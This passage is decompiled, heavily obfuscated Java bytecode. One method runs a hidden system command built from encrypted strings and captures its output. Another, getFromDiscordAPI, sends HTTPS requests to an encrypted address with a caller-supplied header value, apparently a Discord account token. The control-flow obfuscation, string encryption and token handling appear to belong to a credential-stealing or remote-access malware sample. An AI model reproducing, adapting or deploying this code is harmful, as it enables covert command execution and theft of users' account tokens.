    //   257: anewarray java/lang/String
    //   260: astore #20
    //   262: ldc_w 1605649961
    //   265: iload #34
    //   267: ixor
    //   268: i2b
    //   269: istore #5
    //   271: ldc_w 'WQxlJg=='
    //   274: iload #34
    //   276: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   279: astore #6
    //   281: aload #20
    //   283: iload #5
    //   285: aload #6
    //   287: aastore
    //   288: ldc_w 1605649960
    //   291: iload #34
    //   293: ixor
    //   294: i2b
    //   295: istore #22
    //   297: ldc_w 'Fz8='
    //   300: iload #34
    //   302: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   305: astore #26
    //   307: aload #20
    //   309: iload #22
    //   311: aload #26
    //   313: aastore
    //   314: ldc_w 1605649963
    //   317: iload #34
    //   319: ixor
    //   320: i2b
    //   321: istore #23
    //   323: new java/lang/StringBuilder
    //   326: astore #27
    //   328: aload #27
    //   330: invokespecial <init> : ()V
    //   333: ldc_w 'XBB7L1AC'
    //   336: iload #34
    //   338: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   341: astore #32
    //   343: aload #27
    //   345: aload #32
    //   347: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   350: astore #28
    //   352: aload #28
    //   354: aload_1
    //   355: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   358: astore #29
    //   360: aload #29
    //   362: invokevirtual toString : ()Ljava/lang/String;
    //   365: astore #30
    //   367: aload #20
    //   369: iload #23
    //   371: aload #30
    //   373: aastore
    //   374: ldc_w 1605649962
    //   377: iload #34
    //   379: ixor
    //   380: i2b
    //   381: istore #24
    //   383: ldc_w 'Ug1jOh54OgVCYAFPEwJx'
    //   386: iload #34
    //   388: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   391: astore #31
    //   393: aload #20
    //   395: iload #24
    //   397: aload #31
    //   399: aastore
    //   400: aload_3
    //   401: aload #20
    //   403: invokespecial <init> : ([Ljava/lang/String;)V
    //   406: ldc_w 1605649960
    //   409: iload #34
    //   411: ixor
    //   412: i2b
    //   413: istore #18
    //   415: aload_3
    //   416: iload #18
    //   418: invokevirtual redirectErrorStream : (Z)Ljava/lang/ProcessBuilder;
    //   421: astore #7
    //   423: aload_3
    //   424: invokevirtual start : ()Ljava/lang/Process;
    //   427: astore #8
    //   429: new java/io/BufferedReader
    //   432: astore #9
    //   434: new java/io/InputStreamReader
    //   437: astore #21
    //   439: aload #8
    //   441: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   444: astore #25
    //   446: aload #21
    //   448: aload #25
    //   450: invokespecial <init> : (Ljava/io/InputStream;)V
    //   453: aload #9
    //   455: aload #21
    //   457: invokespecial <init> : (Ljava/io/Reader;)V
    //   460: new java/lang/StringBuilder
    //   463: astore #10
    //   465: aload #10
    //   467: invokespecial <init> : ()V
    //   470: iload #34
    //   472: bipush #31
    //   474: imul
    //   475: iconst_4
    //   476: iushr
    //   477: iload #34
    //   479: irem
    //   480: iload #34
    //   482: bipush #16
    //   484: iushr
    //   485: ixor
    //   486: ldc_w 158144603
    //   489: if_icmpne -> 1239
    //   492: ldc_w 469325466
    //   495: iload #34
    //   497: ixor
    //   498: istore #34
    //   500: goto -> 853
    //   503: aload #9
    //   505: invokevirtual readLine : ()Ljava/lang/String;
    //   508: astore #11
    //   510: aload #11
    //   512: ifnull -> 656
    //   515: iload #34
    //   517: bipush #31
    //   519: imul
    //   520: iconst_4
    //   521: iushr
    //   522: iload #34
    //   524: irem
    //   525: iload #34
    //   527: bipush #16
    //   529: iushr
    //   530: ixor
    //   531: ldc_w 18207016
    //   534: if_icmpne -> 1291
    //   537: ldc_w 272776506
    //   540: iload #34
    //   542: ixor
    //   543: istore #34
    //   545: goto -> 1041
    //   548: aload #10
    //   550: aload #11
    //   552: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   555: astore #12
    //   557: ldc_w 'Mg=='
    //   560: iload #34
    //   562: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   565: astore #19
    //   567: aload #12
    //   569: aload #19
    //   571: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   574: astore #13
    //   576: iload #34
    //   578: bipush #31
    //   580: imul
    //   581: iconst_4
    //   582: iushr
    //   583: iload #34
    //   585: irem
    //   586: iload #34
    //   588: bipush #16
    //   590: iushr
    //   591: ixor
    //   592: sipush #30367
    //   595: if_icmpne -> 1229
    //   598: ldc_w 759689886
    //   601: iload #34
    //   603: ixor
    //   604: istore #34
    //   606: goto -> 667
    //   609: aload #8
    //   611: invokevirtual waitFor : ()I
    //   614: istore #16
    //   616: aload #10
    //   618: invokevirtual toString : ()Ljava/lang/String;
    //   621: astore #17
    //   623: iload #34
    //   625: bipush #31
    //   627: imul
    //   628: iconst_4
    //   629: iushr
    //   630: iload #34
    //   632: irem
    //   633: iload #34
    //   635: bipush #16
    //   637: iushr
    //   638: ixor
    //   639: ldc_w 192872495
    //   642: if_icmpne -> 1385
    //   645: ldc_w 1844295021
    //   648: iload #34
    //   650: ixor
    //   651: istore #34
    //   653: goto -> 1395
    //   656: ldc_w 115386479
    //   659: iload #34
    //   661: ixor
    //   662: istore #34
    //   664: goto -> 609
    //   667: iload #34
    //   669: ldc_w 759663625
    //   672: iload #34
    //   674: ixor
    //   675: imul
    //   676: ldc_w 759663634
    //   679: iload #34
    //   681: ixor
    //   682: iushr
    //   683: iload #34
    //   685: irem
    //   686: iload #34
    //   688: ldc_w 759663622
    //   691: iload #34
    //   693: ixor
    //   694: iushr
    //   695: ixor
    //   696: ldc_w 721239611
    //   699: iload #34
    //   701: ixor
    //   702: if_icmpeq -> 729
    //   705: aconst_null
    //   706: athrow
    //   707: nop
    //   708: nop
    //   709: nop
    //   710: nop
    //   711: nop
    //   712: nop
    //   713: nop
    //   714: nop
    //   715: nop
    //   716: nop
    //   717: nop
    //   718: nop
    //   719: nop
    //   720: nop
    //   721: nop
    //   722: nop
    //   723: nop
    //   724: nop
    //   725: nop
    //   726: nop
    //   727: nop
    //   728: athrow
    //   729: new java/lang/RuntimeException
    //   732: dup
    //   733: invokespecial <init> : ()V
    //   736: athrow
    //   737: nop
    //   738: nop
    //   739: nop
    //   740: nop
    //   741: nop
    //   742: nop
    //   743: nop
    //   744: nop
    //   745: nop
    //   746: nop
    //   747: nop
    //   748: nop
    //   749: nop
    //   750: nop
    //   751: nop
    //   752: nop
    //   753: nop
    //   754: nop
    //   755: nop
    //   756: nop
    //   757: nop
    //   758: athrow
    //   759: iload #34
    //   761: bipush #7
    //   763: bipush #29
    //   765: ishl
    //   766: iand
    //   767: bipush #29
    //   769: ishr
    //   770: iload #34
    //   772: iconst_3
    //   773: ishl
    //   774: ior
    //   775: lookupswitch default -> 1249, 1782341809 -> 800, 1850507161 -> 811
    //   800: ldc_w 1064620628
    //   803: iload #34
    //   805: ixor
    //   806: istore #34
    //   808: goto -> 819
    //   811: ldc_w 1073402289
    //   814: iload #34
    //   816: ixor
    //   817: istore #34
    //   819: pop
    //   820: iload #34
    //   822: bipush #31
    //   824: imul
    //   825: iconst_4
    //   826: iushr
    //   827: iload #34
    //   829: irem
    //   830: iload #34
    //   832: bipush #16
    //   834: iushr
    //   835: ixor
    //   836: ldc_w 54760620
    //   839: if_icmpne -> 1261
    //   842: ldc_w 1005229197
    //   845: iload #34
    //   847: ixor
    //   848: istore #34
    //   850: goto -> 503
    //   853: iload #34
    //   855: ldc_w 1145901228
    //   858: iload #34
    //   860: ixor
    //   861: imul
    //   862: ldc_w 1145901239
    //   865: iload #34
    //   867: ixor
    //   868: iushr
    //   869: iload #34
    //   871: irem
    //   872: iload #34
    //   874: ldc_w 1145901219
    //   877: iload #34
    //   879: ixor
    //   880: iushr
    //   881: ixor
    //   882: ldc_w 1075315876
    //   885: iload #34
    //   887: ixor
    //   888: if_icmpeq -> 915
    //   891: aconst_null
    //   892: athrow
    //   893: nop
    //   894: nop
    //   895: nop
    //   896: nop
    //   897: nop
    //   898: nop
    //   899: nop
    //   900: nop
    //   901: nop
    //   902: nop
    //   903: nop
    //   904: nop
    //   905: nop
    //   906: nop
    //   907: nop
    //   908: nop
    //   909: nop
    //   910: nop
    //   911: nop
    //   912: nop
    //   913: nop
    //   914: athrow
    //   915: new java/io/IOException
    //   918: dup
    //   919: invokespecial <init> : ()V
    //   922: athrow
    //   923: nop
    //   924: nop
    //   925: nop
    //   926: nop
    //   927: nop
    //   928: nop
    //   929: nop
    //   930: nop
    //   931: nop
    //   932: nop
    //   933: nop
    //   934: nop
    //   935: nop
    //   936: nop
    //   937: nop
    //   938: nop
    //   939: nop
    //   940: nop
    //   941: nop
    //   942: nop
    //   943: nop
    //   944: athrow
    //   945: iload #34
    //   947: bipush #7
    //   949: bipush #29
    //   951: ishl
    //   952: iand
    //   953: bipush #29
    //   955: ishr
    //   956: iload #34
    //   958: iconst_3
    //   959: ishl
    //   960: ior
    //   961: lookupswitch default -> 1301, 577275290 -> 999, 1768305187 -> 988
    //   988: ldc_w 853573061
    //   991: iload #34
    //   993: ixor
    //   994: istore #34
    //   996: goto -> 1007
    //   999: ldc_w 461482802
    //   1002: iload #34
    //   1004: ixor
    //   1005: istore #34
    //   1007: pop
    //   1008: iload #34
    //   1010: bipush #31
    //   1012: imul
    //   1013: iconst_4
    //   1014: iushr
    //   1015: iload #34
    //   1017: irem
    //   1018: iload #34
    //   1020: bipush #16
    //   1022: iushr
    //   1023: ixor
    //   1024: ldc_w 161281157
    //   1027: if_icmpne -> 1313
    //   1030: ldc_w 1981116750
    //   1033: iload #34
    //   1035: ixor
    //   1036: istore #34
    //   1038: goto -> 503
    //   1041: iload #34
    //   1043: ldc_w 966522858
    //   1046: iload #34
    //   1048: ixor
    //   1049: imul
    //   1050: ldc_w 966522865
    //   1053: iload #34
    //   1055: ixor
    //   1056: iushr
    //   1057: iload #34
    //   1059: irem
    //   1060: iload #34
    //   1062: ldc_w 966522853
    //   1065: iload #34
    //   1067: ixor
    //   1068: iushr
    //   1069: ixor
    //   1070: ldc_w 906362372
    //   1073: iload #34
    //   1075: ixor
    //   1076: if_icmpeq -> 1103
    //   1079: aconst_null
    //   1080: athrow
    //   1081: nop
    //   1082: nop
    //   1083: nop
    //   1084: nop
    //   1085: nop
    //   1086: nop
    //   1087: nop
    //   1088: nop
    //   1089: nop
    //   1090: nop
    //   1091: nop
    //   1092: nop
    //   1093: nop
    //   1094: nop
    //   1095: nop
    //   1096: nop
    //   1097: nop
    //   1098: nop
    //   1099: nop
    //   1100: nop
    //   1101: nop
    //   1102: athrow
    //   1103: new java/lang/RuntimeException
    //   1106: dup
    //   1107: invokespecial <init> : ()V
    //   1110: athrow
    //   1111: nop
    //   1112: nop
    //   1113: nop
    //   1114: nop
    //   1115: nop
    //   1116: nop
    //   1117: nop
    //   1118: nop
    //   1119: nop
    //   1120: nop
    //   1121: nop
    //   1122: nop
    //   1123: nop
    //   1124: nop
    //   1125: nop
    //   1126: nop
    //   1127: nop
    //   1128: nop
    //   1129: nop
    //   1130: nop
    //   1131: nop
    //   1132: athrow
    //   1133: iload #34
    //   1135: bipush #7
    //   1137: bipush #29
    //   1139: ishl
    //   1140: iand
    //   1141: bipush #29
    //   1143: ishr
    //   1144: iload #34
    //   1146: iconst_3
    //   1147: ishl
    //   1148: ior
    //   1149: lookupswitch default -> 1353, -857751639 -> 1187, 1251263467 -> 1176
    //   1176: ldc_w 371794915
    //   1179: iload #34
    //   1181: ixor
    //   1182: istore #34
    //   1184: goto -> 1195
    //   1187: ldc_w 1189104747
    //   1190: iload #34
    //   1192: ixor
    //   1193: istore #34
    //   1195: pop
    //   1196: iload #34
    //   1198: bipush #31
    //   1200: imul
    //   1201: iconst_4
    //   1202: iushr
    //   1203: iload #34
    //   1205: irem
    //   1206: iload #34
    //   1208: bipush #16
    //   1210: iushr
    //   1211: ixor
    //   1212: ldc_w 117425401
    //   1215: if_icmpne -> 1343
    //   1218: ldc_w 2138817814
    //   1221: iload #34
    //   1223: ixor
    //   1224: istore #34
    //   1226: goto -> 548
    //   1229: new java/lang/IllegalAccessException
    //   1232: astore_3
    //   1233: aload_3
    //   1234: invokespecial <init> : ()V
    //   1237: aload_3
    //   1238: athrow
    //   1239: new java/lang/RuntimeException
    //   1242: astore_3
    //   1243: aload_3
    //   1244: invokespecial <init> : ()V
    //   1247: aload_3
    //   1248: athrow
    //   1249: new java/lang/RuntimeException
    //   1252: astore_3
    //   1253: aload_3
    //   1254: ldc 'Error in hash'
    //   1256: invokespecial <init> : (Ljava/lang/String;)V
    //   1259: aload_3
    //   1260: athrow
    //   1261: new java/lang/RuntimeException
    //   1264: astore_3
    //   1265: aload_3
    //   1266: invokespecial <init> : ()V
    //   1269: aload_3
    //   1270: athrow
    //   1271: nop
    //   1272: nop
    //   1273: nop
    //   1274: athrow
    //   1275: nop
    //   1276: nop
    //   1277: nop
    //   1278: nop
    //   1279: nop
    //   1280: athrow
    //   1281: nop
    //   1282: nop
    //   1283: nop
    //   1284: athrow
    //   1285: nop
    //   1286: nop
    //   1287: nop
    //   1288: nop
    //   1289: nop
    //   1290: athrow
    //   1291: new java/lang/IllegalAccessException
    //   1294: astore_3
    //   1295: aload_3
    //   1296: invokespecial <init> : ()V
    //   1299: aload_3
    //   1300: athrow
    //   1301: new java/lang/IllegalAccessException
    //   1304: astore_3
    //   1305: aload_3
    //   1306: ldc 'Error in hash'
    //   1308: invokespecial <init> : (Ljava/lang/String;)V
    //   1311: aload_3
    //   1312: athrow
    //   1313: new java/lang/IllegalAccessException
    //   1316: astore_3
    //   1317: aload_3
    //   1318: invokespecial <init> : ()V
    //   1321: aload_3
    //   1322: athrow
    //   1323: nop
    //   1324: nop
    //   1325: nop
    //   1326: athrow
    //   1327: nop
    //   1328: nop
    //   1329: nop
    //   1330: nop
    //   1331: nop
    //   1332: athrow
    //   1333: nop
    //   1334: nop
    //   1335: nop
    //   1336: athrow
    //   1337: nop
    //   1338: nop
    //   1339: nop
    //   1340: nop
    //   1341: nop
    //   1342: athrow
    //   1343: new java/io/IOException
    //   1346: astore_3
    //   1347: aload_3
    //   1348: invokespecial <init> : ()V
    //   1351: aload_3
    //   1352: athrow
    //   1353: new java/io/IOException
    //   1356: astore_3
    //   1357: aload_3
    //   1358: ldc 'Error in hash'
    //   1360: invokespecial <init> : (Ljava/lang/String;)V
    //   1363: aload_3
    //   1364: athrow
    //   1365: nop
    //   1366: nop
    //   1367: nop
    //   1368: athrow
    //   1369: nop
    //   1370: nop
    //   1371: nop
    //   1372: nop
    //   1373: nop
    //   1374: athrow
    //   1375: nop
    //   1376: nop
    //   1377: nop
    //   1378: athrow
    //   1379: nop
    //   1380: nop
    //   1381: nop
    //   1382: nop
    //   1383: nop
    //   1384: athrow
    //   1385: new java/io/IOException
    //   1388: astore_3
    //   1389: aload_3
    //   1390: invokespecial <init> : ()V
    //   1393: aload_3
    //   1394: athrow
    //   1395: iload #34
    //   1397: ldc_w 1121245138
    //   1400: iload #34
    //   1402: ixor
    //   1403: imul
    //   1404: ldc_w 1121245129
    //   1407: iload #34
    //   1409: ixor
    //   1410: iushr
    //   1411: iload #34
    //   1413: irem
    //   1414: iload #34
    //   1416: ldc_w 1121245149
    //   1419: iload #34
    //   1421: ixor
    //   1422: iushr
    //   1423: ixor
    //   1424: ldc_w 1135146756
    //   1427: iload #34
    //   1429: ixor
    //   1430: if_icmpeq -> 1457
    //   1433: aconst_null
    //   1434: athrow
    //   1435: nop
    //   1436: nop
    //   1437: nop
    //   1438: nop
    //   1439: nop
    //   1440: nop
    //   1441: nop
    //   1442: nop
    //   1443: nop
    //   1444: nop
    //   1445: nop
    //   1446: nop
    //   1447: nop
    //   1448: nop
    //   1449: nop
    //   1450: nop
    //   1451: nop
    //   1452: nop
    //   1453: nop
    //   1454: nop
    //   1455: nop
    //   1456: athrow
    //   1457: new java/lang/IllegalAccessException
    //   1460: dup
    //   1461: invokespecial <init> : ()V
    //   1464: athrow
    //   1465: nop
    //   1466: nop
    //   1467: nop
    //   1468: nop
    //   1469: nop
    //   1470: nop
    //   1471: nop
    //   1472: nop
    //   1473: nop
    //   1474: nop
    //   1475: nop
    //   1476: nop
    //   1477: nop
    //   1478: nop
    //   1479: nop
    //   1480: nop
    //   1481: nop
    //   1482: nop
    //   1483: nop
    //   1484: nop
    //   1485: nop
    //   1486: athrow
    //   1487: iload #34
    //   1489: bipush #7
    //   1491: bipush #29
    //   1493: ishl
    //   1494: iand
    //   1495: bipush #29
    //   1497: ishr
    //   1498: iload #34
    //   1500: iconst_3
    //   1501: ishl
    //   1502: ior
    //   1503: lookupswitch default -> 1626, 380026474 -> 1539, 1963799451 -> 1528
    //   1528: ldc_w 1320169320
    //   1531: iload #34
    //   1533: ixor
    //   1534: istore #34
    //   1536: goto -> 1547
    //   1539: ldc_w 1657102038
    //   1542: iload #34
    //   1544: ixor
    //   1545: istore #34
    //   1547: pop
    //   1548: iload #34
    //   1550: bipush #31
    //   1552: imul
    //   1553: iconst_4
    //   1554: iushr
    //   1555: iload #34
    //   1557: irem
    //   1558: iload #34
    //   1560: bipush #16
    //   1562: iushr
    //   1563: ixor
    //   1564: ldc_w 237099445
    //   1567: if_icmpne -> 1581
    //   1570: ldc_w 340561935
    //   1573: iload #34
    //   1575: ixor
    //   1576: istore #34
    //   1578: goto -> 1591
    //   1581: new java/io/IOException
    //   1584: astore_3
    //   1585: aload_3
    //   1586: invokespecial <init> : ()V
    //   1589: aload_3
    //   1590: athrow
    //   1591: aload #17
    //   1593: areturn
    //   1594: nop
    //   1595: nop
    //   1596: nop
    //   1597: nop
    //   1598: nop
    //   1599: nop
    //   1600: nop
    //   1601: nop
    //   1602: nop
    //   1603: nop
    //   1604: nop
    //   1605: nop
    //   1606: nop
    //   1607: nop
    //   1608: nop
    //   1609: nop
    //   1610: nop
    //   1611: nop
    //   1612: nop
    //   1613: nop
    //   1614: nop
    //   1615: athrow
    //   1616: nop
    //   1617: nop
    //   1618: nop
    //   1619: athrow
    //   1620: nop
    //   1621: nop
    //   1622: nop
    //   1623: nop
    //   1624: nop
    //   1625: athrow
    //   1626: new java/io/IOException
    //   1629: astore_3
    //   1630: aload_3
    //   1631: ldc 'Error in hash'
    //   1633: invokespecial <init> : (Ljava/lang/String;)V
    //   1636: aload_3
    //   1637: athrow
    //   1638: nop
    //   1639: nop
    //   1640: nop
    //   1641: athrow
    //   1642: nop
    //   1643: nop
    //   1644: nop
    //   1645: nop
    //   1646: nop
    //   1647: athrow
    //   1648: nop
    //   1649: nop
    //   1650: nop
    //   1651: athrow
    //   1652: nop
    //   1653: nop
    //   1654: nop
    //   1655: nop
    //   1656: nop
    //   1657: athrow
    //   1658: iload #34
    //   1660: bipush #7
    //   1662: bipush #29
    //   1664: ishl
    //   1665: iand
    //   1666: bipush #29
    //   1668: ishr
    //   1669: iload #34
    //   1671: iconst_3
    //   1672: ishl
    //   1673: ior
    //   1674: lookupswitch default -> 1738, -39702198 -> 1761, 259136 -> 1716, 1322145401 -> 1750, 2043352321 -> 1727
    //   1716: ldc_w 1245804599
    //   1719: iload #34
    //   1721: ixor
    //   1722: istore #34
    //   1724: goto -> 1769
    //   1727: ldc_w 1702388767
    //   1730: iload #34
    //   1732: ixor
    //   1733: istore #34
    //   1735: goto -> 1769
    //   1738: new java/lang/RuntimeException
    //   1741: astore_3
    //   1742: aload_3
    //   1743: ldc 'Error in hash'
    //   1745: invokespecial <init> : (Ljava/lang/String;)V
    //   1748: aload_3
    //   1749: athrow
    //   1750: ldc_w 1670958192
    //   1753: iload #34
    //   1755: ixor
    //   1756: istore #34
    //   1758: goto -> 1769
    //   1761: ldc_w 368394390
    //   1764: iload #34
    //   1766: ixor
    //   1767: istore #34
    //   1769: astore #14
    //   1771: aconst_null
    //   1772: astore #15
    //   1774: aload #15
    //   1776: areturn
    //   1777: nop
    //   1778: nop
    //   1779: nop
    //   1780: nop
    //   1781: nop
    //   1782: nop
    //   1783: nop
    //   1784: nop
    //   1785: nop
    //   1786: nop
    //   1787: nop
    //   1788: nop
    //   1789: nop
    //   1790: nop
    //   1791: nop
    //   1792: nop
    //   1793: nop
    //   1794: nop
    //   1795: nop
    //   1796: nop
    //   1797: nop
    //   1798: athrow
    //   1799: nop
    //   1800: nop
    //   1801: nop
    //   1802: athrow
    //   1803: nop
    //   1804: nop
    //   1805: nop
    //   1806: nop
    //   1807: nop
    //   1808: athrow
    //   1809: new java/lang/RuntimeException
    //   1812: astore_3
    //   1813: aload_3
    //   1814: invokespecial <init> : ()V
    //   1817: aload_3
    //   1818: athrow
    //   1819: new java/lang/IllegalAccessException
    //   1822: astore_3
    //   1823: aload_3
    //   1824: ldc 'Error in hash'
    //   1826: invokespecial <init> : (Ljava/lang/String;)V
    //   1829: aload_3
    //   1830: athrow
    //   1831: nop
    //   1832: nop
    //   1833: nop
    //   1834: athrow
    //   1835: nop
    //   1836: nop
    //   1837: nop
    //   1838: nop
    //   1839: nop
    //   1840: athrow
    //   1841: nop
    //   1842: nop
    //   1843: nop
    //   1844: athrow
    //   1845: nop
    //   1846: nop
    //   1847: nop
    //   1848: nop
    //   1849: nop
    //   1850: athrow
    // Exception table:
    //   from	to	target	type
    //   59	99	151	java/lang/IllegalAccessException
    //   121	129	151	java/lang/IllegalAccessException
    //   242	656	1658	java/lang/Exception
    //   667	707	759	java/lang/RuntimeException
    //   729	737	759	java/lang/RuntimeException
    //   853	893	945	java/io/IOException
    //   915	923	945	java/io/IOException
    //   1041	1081	1133	java/lang/RuntimeException
    //   1103	1111	1133	java/lang/RuntimeException
    //   1395	1435	1487	java/lang/IllegalAccessException
    //   1457	1465	1487	java/lang/IllegalAccessException
  }
  
  public String getFromDiscordAPI(String paramString1, String paramString2, int paramInt) {
    // Byte code:
    //   0: ldc_w 1982030638
    //   3: ldc_w 1733457386
    //   6: aload_0
    //   7: getfield NNmLBEcPbp : I
    //   10: iload_3
    //   11: ixor
    //   12: ixor
    //   13: ixor
    //   14: istore #29
    //   16: iload #29
    //   18: bipush #31
    //   20: imul
    //   21: iconst_4
    //   22: iushr
    //   23: iload #29
    //   25: irem
    //   26: iload #29
    //   28: bipush #16
    //   30: iushr
    //   31: ixor
    //   32: ldc_w 229656100
    //   35: if_icmpne -> 49
    //   38: ldc_w 1333900345
    //   41: iload #29
    //   43: ixor
    //   44: istore #29
    //   46: goto -> 59
    //   49: new java/lang/RuntimeException
    //   52: astore_3
    //   53: aload_3
    //   54: invokespecial <init> : ()V
    //   57: aload_3
    //   58: athrow
    //   59: iload #29
    //   61: ldc_w 1998363780
    //   64: iload #29
    //   66: ixor
    //   67: imul
    //   68: ldc_w 1998363807
    //   71: iload #29
    //   73: ixor
    //   74: iushr
    //   75: iload #29
    //   77: irem
    //   78: iload #29
    //   80: ldc_w 1998363787
    //   83: iload #29
    //   85: ixor
    //   86: iushr
    //   87: ixor
    //   88: ldc_w 1910211819
    //   91: iload #29
    //   93: ixor
    //   94: if_icmpeq -> 121
    //   97: aconst_null
    //   98: athrow
    //   99: nop
    //   100: nop
    //   101: nop
    //   102: nop
    //   103: nop
    //   104: nop
    //   105: nop
    //   106: nop
    //   107: nop
    //   108: nop
    //   109: nop
    //   110: nop
    //   111: nop
    //   112: nop
    //   113: nop
    //   114: nop
    //   115: nop
    //   116: nop
    //   117: nop
    //   118: nop
    //   119: nop
    //   120: athrow
    //   121: new java/lang/RuntimeException
    //   124: dup
    //   125: invokespecial <init> : ()V
    //   128: athrow
    //   129: nop
    //   130: nop
    //   131: nop
    //   132: nop
    //   133: nop
    //   134: nop
    //   135: nop
    //   136: nop
    //   137: nop
    //   138: nop
    //   139: nop
    //   140: nop
    //   141: nop
    //   142: nop
    //   143: nop
    //   144: nop
    //   145: nop
    //   146: nop
    //   147: nop
    //   148: nop
    //   149: nop
    //   150: athrow
    //   151: iload #29
    //   153: bipush #7
    //   155: bipush #29
    //   157: ishl
    //   158: iand
    //   159: bipush #29
    //   161: ishr
    //   162: iload #29
    //   164: iconst_3
    //   165: ishl
    //   166: ior
    //   167: lookupswitch default -> 192, -1192958757 -> 215, -395208974 -> 204
    //   192: new java/lang/RuntimeException
    //   195: astore_3
    //   196: aload_3
    //   197: ldc 'Error in hash'
    //   199: invokespecial <init> : (Ljava/lang/String;)V
    //   202: aload_3
    //   203: athrow
    //   204: ldc_w 1162142346
    //   207: iload #29
    //   209: ixor
    //   210: istore #29
    //   212: goto -> 223
    //   215: ldc_w 1867926735
    //   218: iload #29
    //   220: ixor
    //   221: istore #29
    //   223: pop
    //   224: iload #29
    //   226: bipush #31
    //   228: imul
    //   229: iconst_4
    //   230: iushr
    //   231: iload #29
    //   233: irem
    //   234: iload #29
    //   236: bipush #16
    //   238: iushr
    //   239: ixor
    //   240: ldc_w 252767208
    //   243: if_icmpne -> 257
    //   246: ldc_w 1780255030
    //   249: iload #29
    //   251: ixor
    //   252: istore #29
    //   254: goto -> 267
    //   257: new java/io/IOException
    //   260: astore_3
    //   261: aload_3
    //   262: invokespecial <init> : ()V
    //   265: aload_3
    //   266: athrow
    //   267: new java/net/URL
    //   270: astore #4
    //   272: new java/lang/StringBuilder
    //   275: astore #5
    //   277: aload #5
    //   279: invokespecial <init> : ()V
    //   282: ldc_w 'UgJiNxp6MgpGYx5GUxR+WVFyL3UcXDlUSRA5P1Jr'
    //   285: iload #29
    //   287: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   290: astore #27
    //   292: aload #5
    //   294: aload #27
    //   296: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   299: astore #23
    //   301: aload #23
    //   303: aload_1
    //   304: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   307: astore #24
    //   309: aload #24
    //   311: invokevirtual toString : ()Ljava/lang/String;
    //   314: astore #25
    //   316: aload #4
    //   318: aload #25
    //   320: invokespecial <init> : (Ljava/lang/String;)V
    //   323: aload #4
    //   325: invokevirtual openConnection : ()Ljava/net/URLConnection;
    //   328: astore #6
    //   330: aload #6
    //   332: checkcast javax/net/ssl/HttpsURLConnection
    //   335: astore #7
    //   337: ldc_w 1918261603
    //   340: iload #29
    //   342: ixor
    //   343: i2b
    //   344: istore #18
    //   346: aload #7
    //   348: iload #18
    //   350: invokevirtual setDoOutput : (Z)V
    //   353: ldc_w 'fTNC'
    //   356: iload #29
    //   358: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   361: astore #19
    //   363: aload #7
    //   365: aload #19
    //   367: invokevirtual setRequestMethod : (Ljava/lang/String;)V
    //   370: ldc_w 'ewNiLwYydF9DfgRKUg=='
    //   373: iload #29
    //   375: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   378: astore #20
    //   380: aload #7
    //   382: aload #20
    //   384: aload_2
    //   385: invokevirtual setRequestProperty : (Ljava/lang/String;Ljava/lang/String;)V
    //   388: ldc_w 'bwVzNUQBekBMfg=='
    //   391: iload #29
    //   393: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   396: astore #21
    //   398: ldc_w 'dxlsLgUsfAoXJF0FFDFzVkVtdmVTf0IVCEk4eVBkSkNNNloRHBAuCAgtQWwAUnNsXh9dLx5hKxYUIF8YHE9SfnZPTD5SVn9fX1dSLAkrcwgDQgVWUAV8FxcyLi1dAyIJA1cme1NvTkpGbx9DElkqAA8/NQ=='
    //   401: iload #29
    //   403: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   406: astore #26
    //   408: aload #7
    //   410: aload #21
    //   412: aload #26
    //   414: invokevirtual setRequestProperty : (Ljava/lang/String;Ljava/lang/String;)V
    //   417: aload #7
    //   419: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   422: astore #8
    //   424: new java/util/Scanner
    //   427: astore #9
    //   429: aload #9
    //   431: aload #8
    //   433: invokespecial <init> : (Ljava/io/InputStream;)V
    //   436: aconst_null
    //   437: astore #10
    //   439: iload #29
    //   441: bipush #31
    //   443: imul
    //   444: iconst_4
    //   445: iushr
    //   446: iload #29
    //   448: irem
    //   449: iload #29
    //   451: bipush #16
    //   453: iushr
    //   454: ixor
    //   455: ldc_w 226967419
    //   458: if_icmpne -> 5499
    //   461: ldc_w 835816658
    //   464: iload #29
    //   466: ixor
    //   467: istore #29
    //   469: goto -> 1188
    //   472: ldc_w 'Zj4='
    //   475: iload #29
    //   477: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   480: astore #22
    //   482: aload #9
    //   484: aload #22
    //   486: invokevirtual useDelimiter : (Ljava/lang/String;)Ljava/util/Scanner;
    //   489: astore #11
    //   491: aload #11
    //   493: invokevirtual next : ()Ljava/lang/String;
    //   496: astore #12
    //   498: iload #29
    //   500: bipush #31
    //   502: imul
    //   503: iconst_4
    //   504: iushr
    //   505: iload #29
    //   507: irem
    //   508: iload #29
    //   510: bipush #16
    //   512: iushr
    //   513: ixor
    //   514: ldc_w 100330731
    //   517: if_icmpne -> 2012
    //   520: ldc_w 1182341866
    //   523: iload #29
    //   525: ixor
    //   526: istore #29
    //   528: goto -> 1565
    //   531: aload #9
    //   533: ifnull -> 1991
    //   536: iload #29
    //   538: bipush #31
    //   540: imul
    //   541: iconst_4
    //   542: iushr
    //   543: iload #29
    //   545: irem
    //   546: iload #29
    //   548: bipush #16
    //   550: iushr
    //   551: ixor
